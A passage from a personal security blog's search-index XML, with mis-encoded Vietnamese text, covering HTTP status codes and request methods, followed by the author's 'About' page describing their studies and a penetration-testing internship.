thá»©c khÃ´ng cho phÃ©p vá»›i user hiá»‡n táº¡i.</li><li>410 Gone â€“ Resource khÃ´ng cÃ²n tá»“n táº¡i, Version cÅ© Ä‘Ã£ khÃ´ng cÃ²n há»— trá»£.</li><li>415 Unsupported Media Type â€“ KhÃ´ng há»— trá»£ kiá»ƒu Resource nÃ y.</li><li>422 Unprocessable Entity â€“ Dá»¯ liá»‡u khÃ´ng Ä‘Æ°á»£c xÃ¡c thá»±c</li><li>429 Too Many Requests â€“ Request bá»‹ tá»« chá»‘i do bá»‹ giá»›i háº¡n</li></ul><p><strong>HTTP Request methods (HTTP Verb Tampering)</strong></p><p><strong>GET</strong>: láº¥y thÃ´ng tin tá»« server Ä‘Ã£ cung cáº¥p tá»« url. (CÃ¡c yÃªu cáº§u GET ko áº£nh hÆ°á»›ng Ä‘áº¿n dá»¯ liá»‡u).</p><p><strong>HEAD</strong>: tÆ°Æ¡ng tá»± GET, nhÆ°ng cÃ³ thÃªm tráº¡ng thÃ¡i vÃ  khu vá»±c Header.</p><p><strong>POST</strong>: yÃªu cáº§u gá»­i dá»¯ liá»‡u Ä‘áº¿n server. (vd: thÃ´ng tin khÃ¡ch hÃ ng, file táº£i lÃªn, ..), sá»­ dá»¥ng cÃ¡c tháº» HTML.</p><p><strong>PUT</strong>: thay Ä‘á»•i táº¥t cáº£ cÃ¡c Ä‘áº¡i diá»‡n cá»§a nguá»“n vá»›i ná»™i dung Ä‘Æ°á»£c táº£i lÃªn.</p><p><strong>DELETE</strong>: gá»¡ bá» táº¥t cáº£ cÃ¡c Ä‘áº¡i diá»‡n cá»§a nguá»“n bá»Ÿi URL.</p><p><strong>CONNECT</strong>: thiáº¿t láº­p má»™t tunnel tá»›i server Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh bá»Ÿi URl Ä‘Ã£ cáº¥p.</p><p><strong>OPTIONS</strong>: miÃªu táº£ chá»©c nÄƒng giao tiáº¿p cho nguá»“n má»¥c tiÃªu.</p><p><strong>TRACE</strong>: trÃ¬nh bÃ y vÃ²ng láº·p kiá»ƒm tra thÃ´ng bÃ¡o song song vá»›i path tá»›i resource.</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h2 id="Hello-my-friends-Iâ€™m-a-student-and-a-pentester"><a href="#Hello-my-friends-Iâ€™m-a-student-and-a-pentester" class="headerlink" title="Hello my friends, Iâ€™m a student and a pentester"></a><p align="center" style="color:#2ECC71"><strong>Hello my friends, Iâ€™m a student and a pentester</strong></p></h2><hr><div style="text-align:center"><img width="230" height="230" alt="Khado" src="https://github.com/dovankha/dovankha.github.io/blob/master/img/hinhKha.jpg?raw=true"/></div><blockquote><p>Email: <a href="mailto:&#x64;&#111;&#118;&#97;&#110;&#107;&#x68;&#97;&#46;&#116;&#108;&#118;&#110;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x64;&#111;&#118;&#97;&#110;&#107;&#x68;&#97;&#46;&#116;&#108;&#118;&#110;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></p></blockquote><hr><h3 id="Education"><a href="#Education" class="headerlink" title="Education"></a><strong>Education</strong></h3><ul><li>09&#x2F;2019 - Present: Posts and Telecommunications Institute of Technology.</li><li>Major: Information Technology.</li></ul><hr><h3 id="Experience"><a href="#Experience" class="headerlink" title="Experience"></a><strong>Experience</strong></h3><ul><li>02&#x2F;2022 - 06&#x2F;2022: Intern in Penetration Testing at <a href="https://www.vietsunshine.com.vn/"><span style="color:#FF4500">VietSunshine</span></a> Company.</li></ul><hr><h3 id="Activities"><a href="#Activities" class="headerlink" title="Activities"></a><strong>Activities</strong></h3><ul><li>Chá»§ nhiá»‡m <a href="https://www.facebook.com/PISClub"><span style="color:#FF4500">CLB An toÃ n thÃ´ng tin</span></a> nhiá»‡m ká»³ 2022 - 2023.</li><li>CÃ¡n bá»™ ÄoÃ n xuáº¥t sáº¯c <a href="https://www.facebook.com/lcdattt"><span style="color:#FF4500">LCÄ An toÃ n thÃ´ng tin</span></a> tá»« 2019 - 2022.</li><li>ÄÃ£ tham gia lá»›p cáº£m tÃ¬nh Äáº£ng nÄƒm 2021.</li></ul><hr><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a><strong>Certificate</strong></h3><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center"><img src="/img/ChungNhan/2019.jpg" alt="2019"></td><td align="center"><img src="/img/ChungNhan/2020.jpg" alt="2020"></td></tr><tr><td align="center">2019-2020</td><td align="center">2020-2021</td></tr><tr><td align="center"><img src="/img/ChungNhan/2021.jpg" alt="2021"></td><td align="center"><img src="/img/ChungNhan/Dang.jpg" alt="Dang"></td></tr><tr><td align="center">2021-2022</td><td align="center">Cáº£m tÃ¬nh Äáº£ng</td></tr></tbody></table>]]></content>
    
  </entry>
  
  
  
</search>
